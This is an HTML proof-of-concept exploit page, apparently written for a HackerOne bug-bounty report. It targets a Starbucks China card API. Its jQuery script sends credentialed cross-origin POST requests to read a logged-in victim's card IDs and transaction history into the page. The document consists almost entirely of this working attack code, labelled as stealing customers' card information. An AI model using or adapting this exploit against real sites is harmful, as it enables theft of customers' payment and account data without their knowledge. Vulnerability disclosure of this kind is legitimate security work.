<!DOCTYPE html>
<html>
<head>
<meta name="referrer" content="never">
<script src=../jquery-3.4.1.min.js></script>
</head>
<title>steal the cards informations</title>
</br>
</br>
<div>
click the button to Steal the customer's cards informations!
<button id="stealCards" onclick="stealCustomerCards()">Steal the customer's cards informations</button>
</div>
<div text="steal customer's cards informaiton">
steal customer's cards informaiton
<textarea id="customer" style="width: 200px; height: 150px;"></textarea>
</div>
</br>
</br>
</br>
<script>
	var cardsID;
	function stealCustomerCards(){
		$.ajax({
			    url : 'https://cards.starbucks.com.cn/cards',
			    type : 'POST',
			    dataType:'json',
			    contentType:'application/vnd.api+json',
			    data:JSON.stringify({"data":{"filter":{"domain":"svc"}}}),
			    xhrFields: {
			     withCredentials: true
			 },
			    success : function(response, textStatus, jqXhr) {
				$("＃customer").val(response);
				cardsID = response.data[0].id;
                                console.log(cardsID);
			    },
			    error : function(jqXHR, textStatus, errorThrown) {
				// log the error to the console
				console.log("The following error occured: " + textStatus, errorThrown);
			    },
			    complete : function() {
				console.log("complete");
			    }
        });
	}
	
		
	function stealCardsTransactions(){
		var data = '{"data":{"id":"'+cardsID+'","page":{"page":1,"limit":10},"isNew":true}}';
		$.ajax({
			    url : 'https://cards.starbucks.com.cn/cards/transactions',
			    type : 'POST',
			    dataType:'json',
			    contentType:'application/vnd.api+json',
			    data:JSON.stringify(data),
			    xhrFields: {
			     withCredentials: true
			 },
			    success : function(response, textStatus, jqXhr) {
				$("＃customer").val(response);
                                console.log(response);
			    },
			    error : function(jqXHR, textStatus, errorThrown) {
				// log the error to the console
				console.log("The following error occured: " + textStatus, errorThrown);
			    },
			    complete : function() {
				console.log("complete");
			    }
        });
	}
	
	
</script>
<a href="https://hackerone.com/johnstone">hacker1 johnstone</a>
</html>
